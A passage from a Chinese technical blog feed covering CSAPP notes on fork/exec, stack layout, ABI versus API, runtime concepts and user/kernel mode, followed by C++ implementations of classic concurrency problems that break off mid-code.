terminate</td></tr><tr><td>kill</td><td>Send signal to a process</td></tr></tbody></table><p><code> exit()</code>和<code>_exit()</code>两个函数都是用于函数退出，但这两者有一些细微的差别，在<code>exit()</code>函数里会调用<code>_exit()</code>函数。<code>exit()</code>和<code>_exit()</code>的区别在于，<code>exit()</code>会首先将函数进行调用以后再退出，而<code>_exit()</code>是直接结束进程。</p><h2 id="fork和execve"><a href="#fork和execve" class="headerlink" title="fork和execve"></a>fork和execve</h2><p>对于fork()： </p><ol><li>子进程复制父进程的所有进程内存到其内存地址空间中。父、子进程的“数据段”，“堆栈段”和“代码段”<strong>完全相同</strong>，即子进程中的每一个字节都和父进程一样。</li><li>子进程的当前工作目录、umask掩码值和父进程相同，fork()之前父进程打开的文件描述符，在子进程中同样打开，并且都指向相同的文件表项。</li><li>子进程拥有自己的进程ID。</li></ol><p>对于exec()：</p><ol><li>进程调用exec()后，将在同一块进程内存里用一个新程序来代替调用exec()的那个进程，新程序代替当前进程映像，当前进程的“数据段”，“堆栈段”和“代码段”背新程序改写。</li><li>新程序会保持调用exec()进程的ID不变。</li><li>调用exec()之前打开打开的描述字继续打开（好像有什么参数可以令打开的描述字在新程序中关闭）。</li></ol><h2 id="参数列表的保存结构"><a href="#参数列表的保存结构" class="headerlink" title="参数列表的保存结构"></a>参数列表的保存结构</h2><img src="https://img.lfalive.top/CSAPP-plus/2.png" style="zoom:60%;" /><p>当main开始执行时，用户栈的组织结构如下图。</p><img src="https://img.lfalive.top/CSAPP-plus/3.png" style="zoom:80%;" /><p>从栈底往栈顶（高地址到低地址）依次看。首先是参数和环境字符串。再向上，是以null结尾的env指针数组（每个指针都指向一个env字符串），然后是arg指针数组（同理）。栈顶是系统启动函数<code>libc_start_main</code>。</p><h2 id="使用shell执行ls时涉及哪些syscall"><a href="#使用shell执行ls时涉及哪些syscall" class="headerlink" title="使用shell执行ls时涉及哪些syscall"></a>使用shell执行ls时涉及哪些syscall</h2><p>和解析其他指令一样，会用到进程控制相关的<code>fork()</code>、<code>execve()</code>、<code>getpid()</code>、<code>exit()</code>，以及信号相关的<code>sigprocmask()</code>、<code>*sigblock()</code>和<code>kill()</code>等。除此之外，还有<code>readdir()</code>读取目录项和<code>stat()</code>获取文件状态信息。</p><h2 id="system-library"><a href="#system-library" class="headerlink" title="system library"></a>system library</h2><p><code>/usr/include/sys</code>是一个系统库。<code>sys/</code>是系统调用函数头文件的前缀，这些头文件包含的函数，是<code>syscall</code>系统调用。</p><p><code>#include&lt;sys/xxxxxx.h&gt;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如，定位sys/signal.h，可以发现很多sys目录</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">locate sys/signal.h</span></span><br><span class="line">/tools/Xilinx/SDx/2018.3/gnu/ppc64le/4.9.3/lnx64/powerpc64le-linux-gnu/include/sys/signal.h</span><br><span class="line">/usr/include/sys/signal.h</span><br><span class="line">/usr/lib/x86_64-redhat-linux6E/include/sys/signal.h</span><br><span class="line">/usr/local/MATLAB/R2018b/sys/tcc/linux32/include/sys/signal.h</span><br></pre></td></tr></table></figure><h1 id="ABI和API"><a href="#ABI和API" class="headerlink" title="ABI和API"></a>ABI和API</h1><p>ABI：Application Binary Interface，应用程序二进制接口。</p><p>API：Application Programming Interface，应用程序编程接口。</p><p>ABI定义了一套编译应用程序所需要遵循的规则。主要包括基本数据类型，通用寄存器的使用，参数的传递规则，以及堆栈的使用等等和可执行代码二进制兼容性相关的内容。</p><p>API是一些预先定义的接口（如函数、HTTP接口），或指软件系统不同组成部分衔接的约定。 用来提供应用程序与开发人员基于某软件或硬件得以访问的一组例程，而又无需访问源码，或理解内部工作机制的细节。</p><h1 id="Runtime的概念"><a href="#Runtime的概念" class="headerlink" title="Runtime的概念"></a>Runtime的概念</h1><p>编程语境中，Runtime有很多含义，例如：</p><ul><li><p>指「程序运行的时候」，<strong>即程序生命周期中的一个阶段</strong>。例句：「<em>Rust 比 C 更容易将错误发现在编译时而非运行时。</em>」 </p></li><li><p>指「运行时库」，<strong>即 glibc 这类原生语言的标准库</strong>。例句：「<em>C 程序的 malloc 函数实现需要由运行时提供。</em>」</p></li><li><p>指「运行时系统」，<strong>即某门语言的宿主环境</strong>。例句：「<em>Node.js 是一个 JavaScript 的运行时。</em>」</p></li></ul><h2 id="含义一：程序生命周期中的阶段"><a href="#含义一：程序生命周期中的阶段" class="headerlink" title="含义一：程序生命周期中的阶段"></a>含义一：程序生命周期中的阶段</h2><p>程序的编译阶段是 compile time，链接阶段是 link time，那运行起来的阶段自然就是 run time 了。如果在前面的阶段预先做了通常在后面才方便做的事，我们就管这个叫 ahead of time。</p><h2 id="含义二：运行时库（runtime-library）"><a href="#含义二：运行时库（runtime-library）" class="headerlink" title="含义二：运行时库（runtime library）"></a>含义二：运行时库（runtime library）</h2><p><img src="https://img.lfalive.top/CSAPP-plus/4.jpg"></p><p>运行时库并不只是标准库，就算不显式include任何标准库，也有一些额外的代码会被编译器插入到最后的可执行文件里。比如main函数，它在真正执行前就需要大量来自运行时库的辅助。哪有什么include进来一把梭的岁月静好，还有编译器和运行时替你默默负重前行。</p><h2 id="含义三：运行时系统（runtime-system）"><a href="#含义三：运行时系统（runtime-system）" class="headerlink" title="含义三：运行时系统（runtime system）"></a>含义三：运行时系统（runtime system）</h2><p>上面介绍的运行时库，主要针对的是C、C++和Rust这些「系统级语言」。只要将这个概念继续推广到其他高级语言，这时候的「运行时」指的就是runtime system了——<strong>如果讨论某门高级语言的运行时，我们通常是在讨论一个更重、更大而全的运行时库</strong>。比如Java的运行时是JRE，C#的运行时是CLR。这两者都相当于一个需要在OS上单独安装的软件，借助它们来解释执行相应语言的程序（编译出的字节码）。相比上面C语言的「运行时」，这已经是个复杂的基础软件系统了。</p><h1 id="内核态和用户态区别"><a href="#内核态和用户态区别" class="headerlink" title="内核态和用户态区别"></a>内核态和用户态区别</h1><img src="https://img.lfalive.top/CSAPP-plus/5.png" style="zoom:50%;" /><p>用户态即上层应用程序的活动空间，应用程序的执行必须依托于内核提供的资源，包括CPU资源、存储资源、I&#x2F;O资源等。为了使上层应用能够访问到这些资源，内核必须为上层应用提供访问的接口：即系统调用。</p><img src="https://img.lfalive.top/CSAPP-plus/6.jpg" style="zoom: 80%;" /><p>用户态的应用程序可以通过三种方式来访问内核态的资源：系统调用、库函数、Shell脚本。</p><h2 id="切换"><a href="#切换" class="headerlink" title="切换"></a>切换</h2><p>对不同的操作赋予不同的执行等级，就是所谓特权的概念。简单说就是有多大能力做多大的事，与系统相关的一些特别关键的操作必须由最高特权的程序来完成。运行于用户态的进程可以执行的操作和访问的资源都会受到极大的限制，而运行在内核态的进程则可以执行任何操作并且在资源的使用上没有限制。很多程序开始时运行于用户态，但在执行的过程中，一些操作需要在内核权限下才能执行，这就涉及到一个从用户态切换到内核态的过程。</p><p>用户态切换到内核态的3种方式：</p><p><strong>系统调用</strong></p><p>这是用户态进程主动要求切换到内核态的一种方式，用户态进程通过系统调用申请使用操作系统提供的服务程序完成工作，比如<code>fork()</code>实际上就是执行了一个创建新进程的系统调用。而系统调用的机制其核心还是使用了操作系统为用户特别开放的一个中断来实现。</p><p><strong>异常</strong></p><p>当CPU在执行运行在用户态下的程序时，发生了某些事先不可知的异常，这时会触发由当前运行进程切换到处理此异常的内核相关程序中，也就转到了内核态，比如缺页异常。</p><p><strong>外围设备的中断</strong></p><p>当外围设备完成用户请求的操作后，会向CPU发出相应的中断信号，这时CPU会暂执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换。比如硬盘读写操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。</p><p>这3种方式是系统在运行时由用户态转到内核态的最主要方式，其中系统调用可以认为是用户进程主动发起的，异常和外围设备中断则是被动的。</p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并发经典问题的实现</title>
      <link href="/2022/01/06/Classic-Concurrency-Problems/"/>
      <url>/2022/01/06/Classic-Concurrency-Problems/</url>
      
        <content type="html"><![CDATA[<p>买票问题，⽣产者-消费者，哲学家就餐问题， 读者写者问题，理发师问题，三个烟⻤问题，使用原⼦操作，semaphore，condition variable中任⼀种同步原语实现。</p><p>开始前遇到了一个问题。程序中include了mutex，但是一直提示没有导入。查看了本地库，确实存在mutex文件。原来是安装<strong>mingw</strong>时出现了问题，最后参照<a href="http://www.javashuo.com/article/p-ettlqhdn-mn.html">链接</a>解决。</p><h1 id="买票问题"><a href="#买票问题" class="headerlink" title="买票问题"></a>买票问题</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;condition_variable&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TICKET 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SELLER 4</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">mutex mtx;</span><br><span class="line">thread sellers[MAX_SELLER];</span><br><span class="line">condition_variable cv;</span><br><span class="line"><span class="type">int</span> ticketCnt = MAX_TICKET;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sell</span><span class="params">(<span class="type">int</span> id)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="function">unique_lock&lt;mutex&gt; <span class="title">locker</span><span class="params">(mtx)</span></span>;</span><br><span class="line">      cv.<span class="built_in">wait</span>(locker, [] &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;);</span><br><span class="line">      <span class="keyword">if</span> (ticketCnt == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;Seller &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;Ticket &quot;</span> &lt;&lt; ticketCnt-- &lt;&lt; endl;</span><br><span class="line">      cv.<span class="built_in">notify_all</span>();</span><br><span class="line">      this_thread::<span class="built_in">sleep_for</span>(chrono::<span class="built_in">milliseconds</span>(<span class="number">200</span>));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SELLER; ++i) sellers[i] = <span class="built_in">thread</span>(Sell, i + <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;seller: sellers) &#123; seller.<span class="built_in">join</span>(); &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Classic-Concurrency-Problems/ticket.png"></p><h1 id="⽣产者-消费者"><a href="#⽣产者-消费者" class="headerlink" title="⽣产者-消费者"></a>⽣产者-消费者</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;condition_variable&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OPERATION 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PRODUCER 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CONSUMER 3</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">mutex mtx;</span><br><span class="line">thread producers[MAX_PRODUCER];</span><br><span class="line">thread consumers[MAX_CONSUMER];</span><br><span class="line"><span class="type">int</span> productCnt = <span class="number">0</span>, operation = <span class="number">1</span>;</span><br><span class="line">condition_variable cvConsumer;</span><br><span class="line">condition_variable cvProducer;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Producer</span><span class="params">(<span class="type">int</span> id)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="function">unique_lock&lt;mutex&gt; <span class="title">locker</span><span class="params">(mtx)</span></span>;</span><br><span class="line">      cvProducer.<span class="built_in">wait</span>(locker, [] &#123; <span class="keyword">return</span> productCnt != MAX_SIZE || operation &gt; MAX_OPERATION; &#125;);</span><br><span class="line">      <span class="keyword">if</span> (operation &gt; MAX_OPERATION) <span class="keyword">break</span>;   <span class="comment">//达到操作次数上限</span></span><br><span class="line">      cout &lt;&lt; operation &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;Producer &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;product &quot;</span> &lt;&lt; ++productCnt &lt;&lt; endl;</span><br><span class="line">      operation++;    <span class="comment">//操作次数++</span></span><br><span class="line">      cvConsumer.<span class="built_in">notify_all</span>();    <span class="comment">//通知消费者消费</span></span><br><span class="line">      this_thread::<span class="built_in">sleep_for</span>(chrono::<span class="built_in">milliseconds</span>(<span class="number">200</span>));  <span class="comment">//延时模拟生产过程</span></span><br><span class="line">   &#125;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;Producer &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot; exits&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Consumer</span><span class="params">(<span class="type">int</span> id)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="function">unique_lock&lt;mutex&gt; <span class="title">locker</span><span class="params">(mtx)</span></span>;</span><br><span class="line">      cvConsumer.<span class="built_in">wait</span>(locker, [] &#123; <span class="keyword">return</span> productCnt != <span class="number">0</span> || operation &gt; MAX_OPERATION; &#125;);</span><br><span class="line">      <span class="keyword">if</span> (operation &gt; MAX_OPERATION) <span class="keyword">break</span>;</span><br><span class="line">      cout &lt;&lt; operation &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;Consumer &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;product &quot;</span> &lt;&lt; productCnt-- &lt;&lt; endl;</span><br><span class="line">      operation++;</span><br><span class="line">      cvProducer.<span class="built_in">notify_all</span>();</span><br><span class="line">      this_thread::<span class="built_in">sleep_for</span>(chrono::<span class="built_in">milliseconds</span>(<span class="number">200</span>));</span><br><span class="line">   &#125;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;Consumer &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot; exits&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PRODUCER; ++i) producers[i] = <span class="built_in">thread</span>(Producer, i + <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_CONSUMER; ++i) consumers[i] = <span class="built_in">thread</span>(Consumer, i + <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;producer: producers) &#123; producer.<span class="built_in">join</span>(); &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;consumer: consumers) &#123; consumer.<span class="built_in">join</span>(); &#125;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;products remained: &quot;</span> &lt;&lt; productCnt &lt;&lt; endl;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Classic-Concurrency-Problems/producer.png"></p><h1 id="哲学家就餐问题"><a href="#哲学家就餐问题" class="headerlink" title="哲学家就餐问题"></a>哲学家就餐问题</h1><p>LeetCode1226，见<a href="https://blog.lfalive.top/2022/01/04/LeetCode-Concurrency/#atomic-operation-5">链接</a>。</p><h1 id="读者写者问题（读者优先）"><a href="#读者写者问题（读者优先）" class="headerlink" title="读者写者问题（读者优先）"></a>读者写者问题（读者优先）</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_READER 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_WRITER 1</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">thread writers[MAX_WRITER];</span><br><span class="line">thread readers[MAX_READER];</span><br><span class="line"><span class="type">int</span> readerCnt = <span class="number">0</span>;</span><br><span class="line"><span class="type">sem_t</span> readerSem, w;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Read</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">      <span class="built_in">sem_wait</span>(&amp;readerSem);</span><br><span class="line">      readerCnt++;</span><br><span class="line">      <span class="keyword">if</span> (readerCnt == <span class="number">1</span>) <span class="built_in">sem_wait</span>(&amp;w);   <span class="comment">//first in</span></span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;reader &quot;</span> &lt;&lt; id &lt;&lt; endl;</span><br><span class="line">      <span class="built_in">sem_post</span>(&amp;readerSem);</span><br><span class="line"></span><br><span class="line">      this_thread::<span class="built_in">sleep_for</span>(chrono::<span class="built_in">milliseconds</span>(<span class="number">500</span>));  <span class="comment">//延时模拟reading</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">sem_wait</span>(&amp;readerSem);</span><br><span class="line">      readerCnt--;</span><br><span class="line">      <span class="keyword">if</span> (readerCnt == <span class="number">0</span>) <span class="built_in">sem_post</span>(&amp;w);   <span class="comment">//last out</span></span><br><span class="line">      <span class="built_in">sem_post</span>(&amp;readerSem);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Write</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">      <span class="built_in">sem_wait</span>(&amp;w);</span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;writer &quot;</span> &lt;&lt; id &lt;&lt; endl;</span><br><span class="line">      <span class="built_in">sem_post</span>(&amp;w);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">sem_init</span>(&amp;readerSem, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">   <span class="built_in">sem_init</span>(&amp;w, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_WRITER; ++i) writers[i] = <span class="built_in">thread</span>(Write, i + <span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_READER; ++i) readers[i] = <span class="built_in">thread</span>(Read, i + <span class="number">1</span>, <span class="number">20</span>);</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;writer: writers) writer.<span class="built_in">join</span>();</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;reader: readers) reader.<span class="built_in">join</span>();</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Classic-Concurrency-Problems/reader.png"></p><h1 id="理发师问题"><a href="#理发师问题" class="headerlink" title="理发师问题"></a>理发师问题</h1><h2 id="description"><a href="#description" class="headerlink" title="description"></a>description</h2><p>理发店里有一位理发师，MAX_CHAIR把供顾客等待理发时坐的椅子。如果没有顾客，理发师睡眠，当顾客到来时叫醒理发师。若理发师正在理发时又有顾客来，有空椅子就坐下，否则离开。代码实现一个理发师，MAX_CUSTOMER个顾客的情况。</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;condition_variable&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CHAIR 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CUSTOMER 20</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> empty_chairs = MAX_CHAIR; <span class="comment">// 空椅子数</span></span><br><span class="line">condition_variable cv_barbers; <span class="comment">// 当有顾客到时需通知理发师</span></span><br><span class="line">mutex bar_mtx;</span><br><span class="line">thread customers[MAX_CUSTOMER], thread_barber;</span><br><span class="line"><span class="type">sem_t</span> chairs;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 理发师进程，阻塞理发师的请况</span></span><br><span class="line"><span class="comment">* 1. 没有顾客，则睡觉（阻塞）</span></span><br><span class="line"><span class="comment">* 2. 访问chair临界区受阻，此时chair临界区正在被顾客访问</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">[[noreturn]] <span class="function"><span class="type">void</span> <span class="title">barber</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      unique_lock &lt;mutex&gt; <span class="built_in">lck</span>(bar_mtx);</span><br><span class="line">      cv_barbers.<span class="built_in">wait</span>(lck, [] &#123; <span class="keyword">return</span> MAX_CHAIR - empty_chairs &gt; <span class="number">0</span>; &#125;);</span><br><span class="line">      <span class="built_in">sem_wait</span>(&amp;chairs);</span><br><span class="line">      empty_chairs++;</span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;cut hair&quot;</span> &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; empty_chairs &lt;&lt; <span class="string">&quot; Empty chair(s) left.&quot;</span> &lt;&lt; endl;<span class="comment">// cut hair</span></span><br><span class="line">      <span class="built_in">sem_post</span>(&amp;chairs);</span><br><span class="line">      <span class="comment">// 理发时不断有顾客进来</span></span><br><span class="line">      this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">microseconds</span>(<span class="number">10</span>));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 顾客进程，阻塞顾客进程的情况有一种</span></span><br><span class="line"><span class="comment">* 1. 访问chair临界区（检查是否有空闲的椅子）时发现理发师进程也在访问临界区，P(chairs)</span></span><br><span class="line"><span class="comment">* 没有多余的椅子并不是阻塞顾客进程，直至有空闲椅子，而是直接离开，即该顾客不排队理发</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">customer</span><span class="params">(<span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">sem_wait</span>(&amp;chairs);</span><br><span class="line">   <span class="keyword">if</span> (empty_chairs &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      empty_chairs--;</span><br><span class="line">      cv_barbers.<span class="built_in">notify_one</span>();</span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;customer &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; came. &quot;</span> &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; empty_chairs &lt;&lt; <span class="string">&quot; Empty chair(s) left.&quot;</span> &lt;&lt; endl;</span><br><span class="line">   &#125; <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;customer &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; came and left.&quot;</span> &lt;&lt; endl;</span><br><span class="line">   <span class="built_in">sem_post</span>(&amp;chairs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">sem_init</span>(&amp;chairs, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">   thread_barber = <span class="built_in">thread</span>(barber);</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_CUSTOMER; ++i) customers[i] = <span class="built_in">thread</span>(customer, i + <span class="number">1</span>);</span><br><span class="line">   thread_barber.<span class="built_in">join</span>();</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;customer: customers) &#123; customer.<span class="built_in">join</span>(); &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用信号量实现对椅子资源的互斥访问。使用condition_variable实现理发师的休息和唤醒。输出如下例。</p><blockquote><p>customer 2 came.        9 Empty chair(s) left.<br>cut hair        10 Empty chair(s) left.<br>customer 3 came.        9 Empty chair(s) left.<br>customer 1 came.        8 Empty chair(s) left.<br>customer 14 came.       7 Empty chair(s) left.<br>customer 5 came.        6 Empty chair(s) left.<br>customer 6 came.        5 Empty chair(s) left.<br>customer 7 came.        4 Empty chair(s) left.<br>customer 8 came.        3 Empty chair(s) left.<br>customer 9 came.        2 Empty chair(s) left.<br>customer 10 came.       1 Empty chair(s) left.<br>customer 11 came.       0 Empty chair(s) left.<br>customer 12 came and left.<br>customer 13 came and left.<br>customer 4 came and left.<br>customer 15 came and left.<br>customer 16 came and left.<br>customer 17 came and left.<br>customer 18 came and left.<br>customer 19 came and left.<br>cut hair        1 Empty chair(s) left.<br>customer 20 came.       0 Empty chair(s) left.<br>cut hair        1 Empty chair(s) left.<br>cut hair        2 Empty chair(s) left.<br>cut hair        3 Empty chair(s) left.<br>cut hair        4 Empty chair(s) left.<br>cut hair        5 Empty chair(s) left.<br>cut hair        6 Empty chair(s) left.<br>cut hair        7 Empty chair(s) left.<br>cut hair        8 Empty chair(s) left.<br>cut hair        9 Empty chair(s) left.<br>cut hair        10 Empty chair(s) left.</p></blockquote><h1 id="三个烟⻤问题"><a href="#三个烟⻤问题" class="headerlink" title="三个烟⻤问题"></a>三个烟⻤问题</h1><h2 id="description-1"><a href="#description-1" class="headerlink" title="description"></a>description</h2><p>三个烟鬼问题实际上就是线程的并发问题:</p><ul><li>三个烟鬼，一个有烟草，一个有烟纸，一个有火柴</li><li>上帝拿走两个人的材料给一个人，那么你那个人可以抽一支烟</li><li>当那个人抽完这只烟的时候，上帝重新做决策</li></ul><h2 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SMOKE_CNT 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SMOKERS 3</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span 